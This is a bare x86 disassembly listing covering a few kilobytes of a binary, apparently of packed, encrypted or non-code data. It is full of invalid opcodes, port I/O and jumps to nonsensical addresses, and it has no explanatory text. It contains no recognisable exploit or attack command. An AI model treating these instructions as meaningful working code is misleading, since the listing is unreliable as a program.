  41df99:	and    bl,BYTE PTR [edi+ecx*2+0x8]
  41df9d:	shl    bh,cl
  41df9f:	pushf  
  41dfa0:	mov    bh,0x43
  41dfa2:	mov    ebx,0xb7589a0e
  41dfa7:	shl    DWORD PTR ds:0x2c8c682b,cl
  41dfad:	sub    eax,0x6b94943e
  41dfb2:	add    al,0x91
  41dfb4:	xor    BYTE PTR [eax],bh
  41dfb6:	aad    0xd6
  41dfb8:	inc    esi
  41dfb9:	call   0x3abebef
  41dfbe:	pop    ebp
  41dfbf:	leave  
  41dfc0:	sub    ch,BYTE PTR [esi-0x19]
  41dfc3:	sbb    al,0xcf
  41dfc5:	call   0xcbf0afee
  41dfca:	(bad)  
  41dfcb:	dec    eax
  41dfcc:	in     al,dx
  41dfcd:	cmp    DWORD PTR [bx+di-0x9],esp
  41dfd1:	add    DWORD PTR [eax-0x55],0x48
  41dfd5:	pop    ebp
  41dfd6:	ins    DWORD PTR es:[edi],dx
  41dfd7:	das    
  41dfd8:	mov    BYTE PTR [eax-0x13],bh
  41dfdb:	sub    eax,0x61b83153
  41dfe0:	iret   
  41dfe1:	out    0x4b,eax
  41dfe3:	fld    DWORD PTR [esi+0x2d63727b]
  41dfe9:	into   
  41dfea:	repnz pop eax
  41dfec:	jecxz  0x41df9e
  41dfee:	cmp    eax,0xab4ef91c
  41dff3:	out    dx,al
  41dff4:	stos   DWORD PTR es:[edi],eax
  41dff5:	pop    es
  41dff6:	sub    BYTE PTR [edx+0x14],ch
  41dff9:	int    0xbb
  41dffb:	mov    BYTE PTR [edi-0x74],ch
  41dffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfff:	clc    
  41e000:	sti    
  41e001:	pop    ecx
  41e002:	dec    esp
  41e003:	les    eax,FWORD PTR [eax]
  41e005:	and    eax,0x358f947b
  41e00a:	out    0x89,eax
  41e00c:	icebp  
  41e00d:	cli    
  41e00e:	mov    ebx,0x6f85cdfb
  41e013:	mov    BYTE PTR [ecx+edi*2+0x4],cl
  41e017:	and    dh,BYTE PTR [eax+0x2b]
  41e01a:	lahf   
  41e01b:	sbb    al,0x70
  41e01d:	pushf  
  41e01e:	xchg   ebx,eax
  41e01f:	adc    esi,DWORD PTR [ebx-0x154ae828]
  41e025:	add    BYTE PTR [eax+0x7c],ch
  41e028:	imul   ebp,DWORD PTR [esi-0x29],0x2687d755
  41e02f:	outs   dx,DWORD PTR ds:[esi]
  41e030:	inc    edx
  41e031:	pop    edi
  41e032:	stos   DWORD PTR es:[edi],eax
  41e033:	or     eax,DWORD PTR [edi+0x53d439f7]
  41e039:	imul   dl
  41e03b:	pop    edi
  41e03c:	dec    esp
  41e03d:	inc    ebp
  41e03e:	addr16 push edx
  41e040:	dec    edx
  41e041:	adc    al,0xbf
  41e043:	ss in  eax,dx
  41e045:	je     0x41e088
  41e047:	pop    ss
  41e048:	int    0xc4
  41e04a:	icebp  
  41e04b:	in     eax,dx
  41e04c:	add    ah,0x63
  41e04f:	mov    BYTE PTR [ecx],dl
  41e051:	pop    ds
  41e052:	out    0x9e,al
  41e054:	mov    es,esp
  41e056:	dec    ebp
  41e057:	add    BYTE PTR [esi],ah
  41e059:	and    eax,0x205c06c1
  41e05e:	in     al,0x8
  41e060:	adc    eax,0x3acb6bdf
  41e065:	mov    WORD PTR [ebp+0x1f2e7b52],gs
  41e06b:	imul   esi
  41e06d:	push   ss
  41e06e:	cmp    ebp,ebp
  41e070:	aam    0x48
  41e072:	fldl2t 
  41e074:	test   eax,0xc3566948
  41e079:	mov    bl,0xe1
  41e07b:	ins    BYTE PTR es:[edi],dx
  41e07c:	mov    edx,0x77edc4c5
  41e081:	cmp    ebp,edi
  41e083:	enter  0x1410,0x38
  41e087:	mov    ch,0xbb
  41e089:	mov    esp,DWORD PTR [eax+0x5c]
  41e08c:	cmp    al,0xa8
  41e08e:	cmc    
  41e08f:	cmp    ah,BYTE PTR [eax-0xc]
  41e092:	cmp    BYTE PTR [edx-0xc],ah
  41e095:	ins    BYTE PTR es:[edi],dx
  41e096:	or     eax,0x42feaaef
  41e09b:	(bad)  
  41e09d:	pusha  
  41e09e:	pop    ebp
  41e09f:	outs   dx,BYTE PTR ds:[esi]
  41e0a0:	leave  
  41e0a1:	push   0x3290bc1a
  41e0a6:	xor    al,0xd2
  41e0a8:	xor    dl,dl
  41e0aa:	pop    ds
  41e0ab:	loope  0x41e0c2
  41e0ad:	mov    edx,0xcd173a8b
  41e0b2:	xor    bl,BYTE PTR [edx-0x10]
  41e0b5:	pop    eax
  41e0b6:	ret    
  41e0b7:	rcr    BYTE PTR [esi-0x6],0x56
  41e0bb:	sub    dh,BYTE PTR [ecx]
  41e0bd:	push   esp
  41e0be:	imul   esi,DWORD PTR [esi+ebx*8-0x7],0xffffff84
  41e0c3:	sub    al,0xee
  41e0c5:	dec    ebp
  41e0c6:	dec    eax
  41e0c7:	xchg   ecx,eax
  41e0c8:	and    esp,DWORD PTR ds:0x3d85f43a
  41e0ce:	mov    al,0xf8
  41e0d0:	lods   eax,DWORD PTR ds:[esi]
  41e0d1:	or     eax,0x36ed6083
  41e0d6:	sbb    DWORD PTR [esi-0x7be1f1ca],eax
  41e0dc:	call   0x7e55bf8b
  41e0e1:	sub    eax,eax
  41e0e3:	cmp    ebx,edx
  41e0e5:	xlat   BYTE PTR ds:[ebx]
  41e0e6:	sub    bh,BYTE PTR [esi]
  41e0e8:	sti    
  41e0e9:	popf   
  41e0ea:	icebp  
  41e0eb:	in     al,0x6d
  41e0ed:	dec    edx
  41e0ee:	mov    edx,0x13612aca
  41e0f3:	into   
  41e0f4:	fiadd  WORD PTR [edi]
  41e0f6:	ja     0x41e092
  41e0f8:	mov    edi,0x9ec96a3
  41e0fd:	inc    eax
  41e0fe:	retf   
  41e0ff:	pop    ebx
  41e100:	mov    ds:0x16e7b2e3,eax
  41e105:	cmc    
  41e106:	xlat   BYTE PTR ds:[ebx]
  41e107:	xchg   edx,eax
  41e108:	sbb    ecx,esp
  41e10a:	or     DWORD PTR [eax-0x5d6a67f],esp
  41e110:	sub    edi,0xc9bf4c21
  41e116:	add    DWORD PTR [eax+0x1cfe0f37],ebp
  41e11c:	jmp    0xae809feb
  41e121:	push   esi
  41e122:	retf   0x1b48
  41e125:	inc    ebp
  41e126:	ins    DWORD PTR es:[edi],dx
  41e127:	ret    0x651a
  41e12a:	jns    0x41e191
  41e12c:	mov    ds:0x36a73b64,al
  41e131:	adc    eax,0xeae0fa27
  41e136:	push   eax
  41e137:	pop    es
  41e138:	inc    eax
  41e139:	xchg   ecx,eax
  41e13a:	inc    bx
  41e13c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e13d:	pop    edi
  41e13e:	shl    dh,1
  41e140:	(bad)
  41e144:	loop   0x41e0fb
  41e146:	add    BYTE PTR [ebx+0x6],cl
  41e149:	sbb    DWORD PTR [ebp-0x4],esp
  41e14c:	mov    ecx,0x3199daad
  41e151:	fisub  DWORD PTR [edx+0x20]
  41e154:	sub    DWORD PTR [edi+ebx*4+0x7],ebx
  41e158:	inc    edx
  41e159:	enter  0x1fd4,0xce
  41e15d:	mov    cl,0x6f
  41e15f:	adc    ebp,DWORD PTR ds:0x3c14c632
  41e165:	int3   
  41e166:	jle    0x41e19f
  41e168:	popf   
  41e169:	jg     0x41e1c6
  41e16b:	sbb    eax,0x38d1a3b9
  41e170:	mov    cl,0x8b
  41e172:	mov    esi,0xc3008279
  41e177:	inc    esi
  41e178:	sbb    al,0x93
  41e17a:	out    0x91,eax
  41e17c:	call   0xa301:0x17928d8a
  41e183:	mov    dh,0xe5
  41e185:	fisubr WORD PTR [ecx-0x3af45b02]
  41e18b:	xor    al,0xd4
  41e18d:	ins    BYTE PTR es:[edi],dx
  41e18e:	(bad)  
  41e18f:	ds in  eax,0x80
  41e192:	jp     0x41e154
  41e194:	aas    
  41e195:	icebp  
  41e196:	mov    dh,0x30
  41e198:	mov    ds:0x2b76b0e4,al
  41e19d:	test   DWORD PTR [ecx],eax
  41e19f:	add    al,0x5c
  41e1a1:	test   al,0x5d
  41e1a3:	add    eax,0xa1e844eb
  41e1a8:	dec    ebp
  41e1a9:	and    BYTE PTR [ecx+eiz*8],cl
  41e1ac:	and    eax,0xe65349d6
  41e1b1:	outs   dx,DWORD PTR ds:[esi]
  41e1b2:	(bad)  
  41e1b3:	std    
  41e1b4:	ficom  DWORD PTR [eax-0x4d]
  41e1b7:	sub    BYTE PTR [ebp+0x39],cl
  41e1ba:	into   
  41e1bb:	xor    bl,BYTE PTR [ecx+ebp*2-0x11611f34]
  41e1c2:	fucom  st(0)
  41e1c4:	push   0x8a60d0b
  41e1c9:	ficomp DWORD PTR [edx+0x6efba719]
  41e1cf:	fdivr  DWORD PTR [ebx-0x194c21bc]
  41e1d5:	jmp    0xd95bb146
  41e1da:	dec    ebp
  41e1db:	or     al,0xb0
  41e1dd:	cmp    eax,0x10825595
  41e1e2:	mov    BYTE PTR [ebp+0x1],ch
  41e1e5:	xchg   edx,eax
  41e1e6:	pop    esi
  41e1e7:	ss stos BYTE PTR es:[edi],al
  41e1e9:	add    BYTE PTR [ecx-0x5da4497d],0x70
  41e1f0:	jl     0x41e1e5
  41e1f2:	lock call 0x388b:0x57deb492
  41e1fa:	mov    ebp,0x193ceb5
  41e1ff:	mov    dl,0xa4
  41e201:	lods   al,BYTE PTR ds:[esi]
  41e202:	push   esi
  41e203:	int3   
  41e204:	and    esp,DWORD PTR [edi-0xf]
  41e207:	lods   al,BYTE PTR ds:[esi]
  41e208:	inc    eax
  41e209:	jne    0x41e1b8
  41e20b:	ret    0xbd37
  41e20e:	outs   dx,BYTE PTR ds:[esi]
  41e20f:	hlt    
  41e210:	adc    BYTE PTR [ebp+0x2633a457],0x64
  41e217:	retf   
  41e218:	mov    bh,0x9a
  41e21a:	rcl    eax,0x6d
  41e21d:	adc    dh,bl
  41e21f:	xor    DWORD PTR [ebx],0x2a2d9ad
  41e225:	call   0x3ef1a65
  41e22a:	call   0xabf00648
  41e22f:	(bad)  [esi]
  41e231:	fst    DWORD PTR [edi]
  41e233:	xor    al,0xd5
  41e235:	mov    edi,0xfae514ee
  41e23a:	fs mov dl,0x70
  41e23d:	xor    al,0xc4
  41e23f:	add    DWORD PTR [ecx-0x46],ebp
  41e242:	(bad)  
  41e243:	push   0xef13249d
  41e248:	sub    al,0x27
  41e24a:	or     eax,0x81a77fe
  41e24f:	xchg   esi,eax
  41e250:	mov    DWORD PTR [ebp+0x7c],ebp
  41e253:	repz repz gs pop ebp
  41e257:	fwait
  41e258:	mov    ebp,0xa305f344
  41e25d:	mov    dh,0xbf
  41e25f:	cmc    
  41e260:	rol    DWORD PTR [edi],cl
  41e262:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e263:	add    eax,0x5429515e
  41e268:	cmc    
  41e269:	call   FWORD PTR [edi]
  41e26b:	sahf   
  41e26c:	ret    0x1469
  41e26f:	aaa    
  41e270:	fdiv   DWORD PTR [edi-0x49]
  41e273:	ret    0x42ce
  41e276:	loop   0x41e25a
  41e278:	xor    DWORD PTR [edi],0x44
  41e27b:	arpl   WORD PTR [eax+0x5a],bx
  41e27e:	push   edx
  41e27f:	cmc    
  41e280:	xchg   BYTE PTR [edi],al
  41e282:	add    eax,0x754adfe8
  41e287:	and    al,0xd7
  41e289:	push   ss
  41e28a:	add    al,0x14
  41e28c:	sub    DWORD PTR [esi-0x2a],ecx
  41e28f:	sub    edx,esp
  41e291:	sub    DWORD PTR [edx+0x4bc90a8d],eax
  41e297:	sbb    bh,BYTE PTR [ecx-0x5f]
  41e29a:	jnp    0x41e2b3
  41e29c:	mov    bl,0x7b
  41e29e:	xor    bl,BYTE PTR [eax]
  41e2a0:	fimul  DWORD PTR [esp+edi*8-0x4454772c]
  41e2a7:	fdiv   QWORD PTR [esp+ebx*2+0x42228a02]
  41e2ae:	fidivr WORD PTR [eax+0x111387dd]
  41e2b4:	add    al,0x2e
  41e2b6:	jmp    0xab73:0x558c6c1
  41e2bd:	jmp    0x7cbdcf59
  41e2c2:	inc    ecx
  41e2c3:	sbb    eax,0xc24b9868
  41e2c8:	fucomi st,st(4)
  41e2ca:	mov    esp,0xacb1ecf0
  41e2cf:	or     eax,0xf27ea01e
  41e2d4:	jg     0x41e2f0
  41e2d6:	xchg   ebx,edx
  41e2d8:	add    DWORD PTR [esi],ebp
  41e2da:	mov    ebp,0x938761a4
  41e2df:	pop    es
  41e2e0:	mov    ds:0x59a56b33,eax
  41e2e5:	and    ah,dl
  41e2e7:	jo     0x41e306
  41e2e9:	jnp    0x41e31f
  41e2eb:	dec    eax
  41e2ec:	dec    ecx
  41e2ed:	push   ebp
  41e2ee:	and    DWORD PTR [ecx],0x28011339
  41e2f4:	add    ebp,DWORD PTR [esi]
  41e2f6:	xor    ah,ah
  41e2f8:	fsub   DWORD PTR [esi-0x59d76e82]
  41e2fe:	push   0x7d
  41e300:	out    dx,al
  41e301:	dec    ecx
  41e302:	mov    ds:0x8941fc60,al
  41e307:	je     0x41e317
  41e309:	xor    eax,0xff27c98e
  41e30e:	mov    bh,BYTE PTR [edi-0x3bde4faa]
  41e314:	mov    cl,0x18
  41e316:	mov    esp,DWORD PTR [ebx+0x2d6dd9dc]
  41e31c:	jne    0x41e37a
  41e31e:	icebp  
  41e31f:	sbb    al,0xa8
  41e321:	pop    ss
  41e322:	and    eax,0x68e64393
  41e327:	(bad)  
  41e328:	ficomp DWORD PTR [ecx]
  41e32a:	mov    cl,0x33
  41e32c:	or     BYTE PTR [eax],dh
  41e32e:	jle    0x41e392
  41e330:	jg     0x41e2c7
  41e332:	and    al,0x67
  41e334:	iret   
  41e335:	mov    edi,0x6f3194e3
  41e33a:	add    BYTE PTR [eax+0x27],ah
  41e33d:	jo     0x41e3a7
  41e33f:	sub    ah,BYTE PTR ds:0x73d3f73d
  41e345:	adc    edi,DWORD PTR [edx+0x218afe36]
  41e34b:	test   BYTE PTR cs:[eax-0x42],bh
  41e34f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e350:	mov    dl,0x7
  41e352:	push   ds
  41e353:	mov    ebp,0x3e16263a
  41e358:	cmp    bh,BYTE PTR [edx-0x6bcc1c34]
  41e35e:	out    0x27,eax
  41e360:	jb     0x41e3b6
  41e362:	rol    DWORD PTR [edx-0x54],cl
  41e365:	dec    esp
  41e366:	stc    
  41e367:	(bad)  
  41e368:	retf   0xc269
  41e36b:	out    dx,al
  41e36c:	inc    edx
  41e36d:	sub    eax,0xc52d37c7
  41e373:	cmp    DWORD PTR [edx-0x6f],0x2a
  41e377:	dec    ecx
  41e378:	jmp    0x60eb01e3
  41e37d:	std    
  41e37e:	pushf  
  41e37f:	inc    edx
  41e380:	push   eax
  41e381:	nop
  41e382:	fist   WORD PTR [ecx+0x6f6bd6ee]
  41e388:	push   esp
  41e389:	inc    ebx
  41e38a:	nop
  41e38b:	test   BYTE PTR [ebp+0x6f3a61dc],ch
  41e391:	data16 xor bl,BYTE PTR [ecx+0x61]
  41e395:	cwde   
  41e396:	inc    edx
  41e397:	es lahf 
  41e399:	mov    WORD PTR [esi],fs
  41e39b:	shr    BYTE PTR [edx-0x2864ebc6],1
  41e3a1:	jne    0x41e411
  41e3a3:	data16 test al,dl
  41e3a6:	add    BYTE PTR ds:0xf1da7dd4,al
  41e3ac:	(bad)  
  41e3ad:	pop    ss
  41e3ae:	dec    edx
  41e3af:	mov    eax,ds:0x9df710d9
  41e3b4:	adc    cl,ah
  41e3b6:	sub    bh,BYTE PTR [ecx]
  41e3b8:	jns    0x41e3b4
  41e3ba:	jbe    0x41e3a8
  41e3bc:	mov    cl,0x4a
  41e3be:	rcr    edi,cl
  41e3c0:	lea    ecx,[esi+0x60]
  41e3c3:	mov    eax,0x69aaec89
  41e3c8:	and    bh,bh
  41e3ca:	mov    ?,ebx
  41e3cc:	sbb    dh,BYTE PTR [ebx+0x4339fcb0]
  41e3d2:	xchg   esi,eax
  41e3d3:	mov    ah,0x19
  41e3d5:	stc    
  41e3d6:	fdivr  DWORD PTR [edx]
  41e3d8:	cmc    
  41e3d9:	out    0xfa,eax
  41e3db:	push   edi
  41e3dc:	add    dh,BYTE PTR ds:[edi-0x25c22ee5]
  41e3e3:	push   ebx
  41e3e4:	or     al,0x87
  41e3e6:	lock xchg ecx,eax
  41e3e8:	fst    DWORD PTR [ebp-0x6a920913]
  41e3ee:	push   edx
  41e3ef:	call   0xaff9f4d9
  41e3f4:	mov    edx,0x6db3a5ee
  41e3f9:	(bad)  
  41e3fb:	mov    WORD PTR [esi],ds
  41e3fd:	cwde   
  41e3fe:	inc    ebx
  41e3ff:	ss mov ecx,esp
  41e402:	fadd   DWORD PTR [ecx-0x5f]
  41e405:	adc    DWORD PTR ds:0xae09ab2b,edx
  41e40b:	jb     0x41e3b7
  41e40d:	xor    al,0x59
  41e40f:	xchg   BYTE PTR [esi-0x56],ah
  41e412:	inc    ebp
  41e413:	adc    esi,DWORD PTR [ecx+0x70]
  41e416:	cli    
  41e417:	leave  
  41e418:	cwde   
  41e419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e41a:	test   DWORD PTR [eax-0x4a],ebp
  41e41d:	cmp    BYTE PTR [eax-0x57],ch
  41e420:	test   esp,ecx
  41e422:	aaa    
  41e423:	sti    
  41e424:	push   es
  41e425:	add    bh,al
  41e427:	inc    edx
  41e428:	sub    al,0xef
  41e42a:	mov    eax,ds:0xc2141453
  41e42f:	jmp    0x41e479
  41e431:	xchg   DWORD PTR [esi+0x57],edi
  41e434:	push   ebx
  41e435:	cmp    eax,0x28777289
  41e43a:	xchg   edx,eax
  41e43b:	jne    0x41e474
  41e43d:	xchg   DWORD PTR [ecx-0x3da281f2],edi
  41e443:	popa   
  41e444:	stos   BYTE PTR es:[edi],al
  41e445:	outs   dx,DWORD PTR ds:[esi]
  41e446:	or     BYTE PTR [eax+0x40],dh
  41e449:	enter  0xacc1,0x41
  41e44d:	xchg   DWORD PTR [ebp-0x453ae151],edi
  41e453:	nop
  41e454:	pushf  
  41e455:	jae    0x41e42e
  41e457:	mov    BYTE PTR [ebx-0x6b],cl
  41e45a:	stos   BYTE PTR es:[edi],al
  41e45b:	xchg   ebp,eax
  41e45c:	fwait
  41e45d:	xor    DWORD PTR [esi+0x61f8a3f2],ecx
  41e463:	mov    edi,0xc7258807
  41e468:	mov    esp,0x9a13de95
  41e46d:	mov    ebx,?
  41e46f:	push   cs
  41e470:	sbb    BYTE PTR [eax],cl
  41e472:	in     eax,0xf1
  41e474:	mov    dh,0xfb
  41e476:	mov    ebp,0xf0286333
  41e47b:	mov    esi,0xed94812b
  41e480:	test   DWORD PTR [ebp-0x301f652a],ebp
  41e486:	rcl    BYTE PTR [eax-0x60f3ccf0],0x9e
  41e48d:	inc    edi
  41e48e:	inc    edx
  41e48f:	inc    ecx
  41e490:	lahf   
  41e491:	movlps xmm2,QWORD PTR [eax-0x19]
  41e495:	in     eax,0xa0
  41e497:	fs or  eax,edx
  41e49a:	aam    0xbc
  41e49c:	and    BYTE PTR [esi-0x7065d361],dl
  41e4a2:	adc    eax,0x78b8e8af
  41e4a7:	nop
  41e4a8:	mov    ebx,0x8932c7a
  41e4ad:	fcom   st(0)
  41e4af:	or     DWORD PTR [edi-0x3757e52],0x8
  41e4b6:	and    al,0x91
  41e4b8:	aam    0x4f
  41e4ba:	fstp   DWORD PTR [ebx*2-0x3fd8e6c7]
  41e4c1:	add    DWORD PTR [ecx],esp
  41e4c3:	sub    ebp,esp
  41e4c5:	push   ebx
  41e4c6:	nop
  41e4c7:	clc    
  41e4c8:	test   eax,0x413286a7
  41e4cd:	mov    dl,0xc0
  41e4cf:	fbstp  TBYTE PTR [esi+0x6ad04b9c]
  41e4d5:	adc    al,0x3
  41e4d7:	popa   
  41e4d8:	aad    0x73
  41e4da:	aas    
  41e4db:	lods   eax,DWORD PTR ds:[esi]
  41e4dc:	fwait
  41e4dd:	mov    bh,0x7b
  41e4df:	and    DWORD PTR [esp+edx*4+0x74],ecx
  41e4e3:	rcl    ecx,0xd4
  41e4e6:	aaa    
  41e4e7:	cmp    al,0xbc
  41e4e9:	scas   al,BYTE PTR es:[edi]
  41e4ea:	and    al,0x6f
  41e4ec:	in     al,0x1a
  41e4ee:	popf   
  41e4ef:	adc    DWORD PTR [esi+ebx*1],esp
  41e4f2:	std    
  41e4f3:	jnp    0x41e51c
  41e4f5:	dec    ebp
  41e4f6:	cmp    al,0xba
  41e4f8:	push   ebx
  41e4f9:	pop    es
  41e4fa:	shl    dl,0xd8
  41e4fd:	and    eax,edx
  41e4ff:	rol    DWORD PTR [eax],1
  41e501:	mov    dl,0x64
  41e503:	enter  0x9c6a,0x9f
  41e507:	imul   DWORD PTR [eax+0x4c6a9462]
  41e50d:	and    edi,ecx
  41e50f:	mov    dl,0xd
  41e511:	ins    BYTE PTR es:[edi],dx
  41e512:	dec    edx
  41e513:	stos   DWORD PTR es:[edi],eax
  41e514:	leave  
  41e515:	stos   BYTE PTR es:[edi],al
  41e516:	mov    edx,0x55504714
  41e51b:	aas    
  41e51c:	mov    cl,0x4a
  41e51e:	xchg   ebp,eax
  41e51f:	lahf   
  41e520:	in     eax,0x9d
  41e522:	sbb    eax,0xb7168160
  41e527:	retf   0x5aa
  41e52a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e52b:	push   ds
  41e52c:	cmp    ecx,ebx
  41e52e:	shl    BYTE PTR [eax],0x1f
  41e531:	mov    ebx,0x32cebe8c
  41e536:	imul   esp,DWORD PTR [edx-0x7c],0x4
  41e53a:	das    
  41e53b:	pop    ds
  41e53c:	into   
  41e53d:	ficom  WORD PTR [edx+0x4f938f34]
  41e543:	shl    DWORD PTR [ecx-0x4d872946],0x4f
  41e54a:	psubq  mm4,QWORD PTR [eax]
  41e54d:	mov    cl,bl
  41e54f:	(bad)  
  41e550:	and    ebp,DWORD PTR [ebp-0x8821d10]
  41e556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e557:	push   edx
  41e558:	rol    bl,0x87
  41e55b:	outs   dx,BYTE PTR ds:[esi]
  41e55c:	jecxz  0x41e56c
  41e55e:	push   es
  41e55f:	fucomi st,st(0)
  41e561:	out    dx,al
  41e562:	sub    BYTE PTR [eax+0x48a3e4d2],cl
  41e568:	stos   BYTE PTR es:[edi],al
  41e569:	adc    dl,BYTE PTR [ebx-0x37]
  41e56c:	mov    dl,0xe7
  41e56e:	in     eax,dx
  41e56f:	outs   dx,DWORD PTR ds:[esi]
  41e570:	adc    edi,esi
  41e572:	push   0x5e2bde0b
  41e577:	ins    BYTE PTR es:[edi],dx
  41e578:	inc    esp
  41e579:	push   eax
  41e57a:	ror    BYTE PTR [esi+0x336d82f2],0x70
  41e581:	cwde   
  41e582:	cwde   
  41e583:	sub    dh,cl
  41e585:	nop
  41e586:	xor    bl,BYTE PTR [eax]
  41e588:	push   esi
  41e589:	nop
  41e58a:	xor    dh,BYTE PTR [edi+0x2f]
  41e58d:	fs mov ebp,0xa8345433
  41e593:	dec    esi
  41e594:	mov    cl,0x77
  41e596:	aaa    
  41e597:	ret    0xd444
  41e59a:	fcom   QWORD PTR [edx+0x45]
  41e59d:	in     eax,0x7b
  41e59f:	mov    ds:0x2b51eaa7,eax
  41e5a4:	xor    bh,al
  41e5a6:	push   0x5be8e45d
  41e5ab:	push   ecx
  41e5ac:	fisttp DWORD PTR [esi+0x4e5f81be]
  41e5b2:	sbb    BYTE PTR [eax-0x24],dh
  41e5b5:	js     0x41e5cc
  41e5b7:	rol    bh,1
  41e5b9:	adc    ecx,0xfffffff8
  41e5bc:	out    0xb7,eax
  41e5be:	sbb    ebp,esp
  41e5c0:	(bad)  
  41e5c2:	test   al,0xc2
  41e5c4:	mov    dl,0xd4
  41e5c6:	and    al,0xe6
  41e5c8:	fsubr  st,st(4)
  41e5ca:	pop    ebp
  41e5cb:	jno    0x41e60a
  41e5cd:	ins    DWORD PTR es:[edi],dx
  41e5ce:	in     al,0xde
  41e5d0:	jae    0x41e636
  41e5d2:	stos   DWORD PTR es:[edi],eax
  41e5d3:	or     esi,DWORD PTR [ebp+0x5b6e12fe]
  41e5d9:	(bad)  
  41e5db:	sbb    BYTE PTR [ecx],ah
  41e5dd:	int    0x98
  41e5df:	fwait
  41e5e0:	add    eax,0x7e5820fc
  41e5e5:	in     eax,0xe0
  41e5e7:	pop    ss
  41e5e8:	call   0x5cd3:0xf0024aaf
  41e5ef:	inc    ebp
  41e5f0:	jmp    0x6372406b
  41e5f5:	fisub  DWORD PTR [edx]
  41e5f7:	and    BYTE PTR [ebp-0x3a],ah
  41e5fa:	(bad)  
  41e5fb:	iret   
  41e5fc:	adc    edi,eax
  41e5fe:	into   
  41e5ff:	push   eax
  41e600:	cld    
  41e601:	sahf   
  41e602:	add    BYTE PTR [ebx+eax*2-0x46],cl
  41e606:	cmp    al,0xc8
  41e608:	xchg   BYTE PTR [edx],cl
  41e60a:	mov    ds:0x336bcc29,al
  41e60f:	hlt    
  41e610:	xor    eax,0xf70c8955
  41e615:	or     edi,DWORD PTR ds:0x9cd41e87
  41e61b:	mov    ds:0x2fd0d416,al
  41e620:	mov    edx,0x8aa4bac5
  41e625:	and    ebx,edx
  41e627:	mov    edi,DWORD PTR [eax-0x2e]
  41e62a:	adc    eax,0xfc42823e
  41e62f:	add    DWORD PTR [ebx-0x3d],edx
  41e632:	fmul   QWORD PTR ds:[ebp-0x2b]
  41e636:	iret   
  41e637:	pop    edi
  41e638:	mov    al,0x39
  41e63a:	(bad)  
  41e63b:	sub    al,0xd3
  41e63d:	hlt    
  41e63e:	pop    esp
  41e63f:	loop   0x41e698
  41e641:	or     ecx,DWORD PTR [edx+eax*1]
  41e644:	or     BYTE PTR [edx-0x2d2e589],ch
  41e64a:	mov    cl,0x9
  41e64c:	bound  edx,QWORD PTR [eax-0xd94f781]
  41e652:	lods   eax,DWORD PTR ds:[esi]
  41e653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e654:	out    dx,al
  41e655:	and    ecx,edx
  41e657:	mov    eax,0x81c83ba7
  41e65c:	jle    0x41e6d0
  41e65e:	fmul   DWORD PTR [ebx+0x57]
  41e661:	mov    DWORD PTR [edx+0x241e29e2],edi
  41e667:	push   ss
  41e668:	jle    0x41e625
  41e66a:	cmp    BYTE PTR [edi-0xd],0x5e
  41e66e:	sbb    al,0x54
  41e670:	jnp    0x41e6ce
  41e672:	sahf   
  41e673:	sub    DWORD PTR [esi+0x6d],esi
  41e676:	pop    edx
  41e677:	fnstcw WORD PTR [edi]
  41e679:	bnd je 0x41e626
  41e67c:	and    edi,esp
  41e67e:	cli    
  41e67f:	mov    al,BYTE PTR [ebx-0x48]
  41e682:	sub    edi,DWORD PTR [edi]
  41e684:	mov    al,ds:0x3e45e029
  41e689:	call   0x577420c4
  41e68e:	jecxz  0x41e701
  41e690:	xchg   esp,eax
  41e691:	or     eax,0x167eeadc
  41e696:	xor    edx,edx
  41e698:	mov    esp,0xb496543c
  41e69d:	mov    BYTE PTR [edi+0x55],al
  41e6a0:	or     al,0x22
  41e6a2:	cmp    eax,0xa5f29770
  41e6a7:	shl    al,0x6d
  41e6aa:	cmp    eax,0xd8cb7a1b
  41e6af:	addr16 (bad) 
  41e6b1:	hlt    
  41e6b2:	push   esi
  41e6b3:	pop    eax
  41e6b4:	loopne 0x41e668
  41e6b6:	pop    ss
  41e6b7:	sub    eax,0x29cafe63
  41e6bc:	jnp    0x41e715
  41e6be:	xchg   edi,eax
  41e6bf:	jle    0x41e695
  41e6c1:	call   0x5b13aaa7
  41e6c6:	pop    es
  41e6c7:	icebp  
  41e6c8:	test   eax,0xdc61dcdd
  41e6cd:	sbb    BYTE PTR [ebp-0x23],ch
  41e6d0:	mov    DWORD PTR [esi+0x3d],esi
  41e6d3:	fst    DWORD PTR ds:0x67b56bbd
  41e6d9:	inc    esi
  41e6da:	inc    edx
  41e6db:	jecxz  0x41e6b2
  41e6dd:	dec    ebx
  41e6de:	xchg   BYTE PTR [eax+0x5d],dh
  41e6e1:	ins    DWORD PTR es:[edi],dx
  41e6e2:	(bad)  
  41e6e3:	add    WORD PTR ds:[edx+eax*8],di
  41e6e8:	mov    ah,0xee
  41e6ea:	xor    DWORD PTR [edi],ecx
  41e6ec:	pop    ss
  41e6ed:	arpl   ax,dx
  41e6ef:	lahf   
  41e6f0:	mov    DWORD PTR [eax-0x1a],ebx
  41e6f3:	sbb    ebp,ebp
  41e6f5:	retf   0xd46b
  41e6f8:	aad    0x43
  41e6fa:	out    dx,eax
  41e6fb:	fsubr  st,st(1)
  41e6fd:	mov    dh,0xef
  41e6ff:	dec    eax
  41e700:	mul    BYTE PTR [ecx+ebx*2+0x6d]
  41e704:	mov    eax,ds:0x27c07984
  41e709:	outs   dx,DWORD PTR ds:[esi]
  41e70a:	ins    BYTE PTR es:[edi],dx
  41e70b:	(bad)  
  41e70c:	ins    DWORD PTR es:[edi],dx
  41e70d:	cmp    bh,BYTE PTR ds:0x2723b2c5
  41e713:	ds ja  0x41e77d
  41e716:	fwait
  41e717:	scas   al,BYTE PTR es:[edi]
  41e718:	xchg   BYTE PTR [eax+0x44ebae61],bl
  41e71e:	sub    edx,DWORD PTR [eax+eax*1]
  41e721:	push   0xffffffde
  41e723:	add    DWORD PTR [eax+0x3a9b9c5c],edx
  41e729:	inc    esi
  41e72a:	cmp    BYTE PTR [ebp-0x2a],ch
  41e72d:	mov    dl,0x79
  41e72f:	popa   
  41e730:	or     ebx,ecx
  41e732:	stos   DWORD PTR es:[edi],eax
  41e733:	(bad)  
  41e734:	xor    BYTE PTR [ebx+0x2a2301b2],dl
